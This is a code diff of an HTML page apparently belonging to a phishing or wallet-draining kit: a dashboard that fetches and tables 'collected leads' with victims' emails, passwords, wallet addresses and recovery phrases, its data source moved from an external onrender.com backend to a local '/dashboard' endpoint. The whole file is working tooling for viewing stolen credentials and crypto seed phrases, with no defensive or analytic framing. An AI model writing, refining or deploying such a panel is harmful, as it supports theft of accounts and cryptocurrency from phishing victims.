@@ -1,8 +1,7 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Lead Dashboard</title>
+    <title>Dashboard</title>
     <style>
         body { font-family: sans-serif; background: #f4f7f9; padding: 20px; }
         table { width: 100%; border-collapse: collapse; background: white; }
@@ -11,41 +10,29 @@
     </style>
 </head>
 <body>
-    <h1>Collected Leads</h1>
-    <table id="leadsTable">
+    <h1>Leads</h1>
+    <table>
         <thead>
             <tr>
-                <th>Email</th>
-                <th>Password</th>
-                <th>Wallet/Phrase</th>
-                <th>Time</th>
+                <th>Email</th><th>Pass</th><th>Wallet/Phrase</th><th>Date</th>
             </tr>
         </thead>
-        <tbody id="leadsBody"></tbody>
+        <tbody id="body"></tbody>
     </table>
-
     <script>
-        async function loadLeads() {
-            try {
-                const res = await fetch('https://cb-backend-new.onrender.com/dashboard');
-                const data = await res.json();
-                const body = document.getElementById('leadsBody');
-                body.innerHTML = ''; 
-                data.forEach(lead => {
-                    const row = `<tr>
-                        <td>${lead.email || 'N/A'}</td>
-                        <td>${lead.password || 'N/A'}</td>
-                        <td>${lead.walletAddress || lead.recoveryPhrase || 'N/A'}</td>
-                        <td>${new Date(lead.timestamp).toLocaleString()}</td>
-                    </tr>`;
-                    body.innerHTML += row;
-                });
-            } catch (e) {
-                console.error(e);
-                document.getElementById('leadsBody').innerHTML = '<tr><td colspan="4">Error loading leads.</td></tr>';
-            }
+        async function load() {
+            const res = await fetch('/dashboard');
+            const data = await res.json();
+            const body = document.getElementById('body');
+            data.forEach(l => {
+                body.innerHTML += `<tr>
+                    <td>${l.email}</td><td>${l.password}</td>
+                    <td>${l.walletAddress || l.recoveryPhrase}</td>
+                    <td>${new Date(l.timestamp).toLocaleString()}</td>
+                </tr>`;
+            });
         }
-        loadLeads();
+        load();
     </script>
 </body>
 </html>
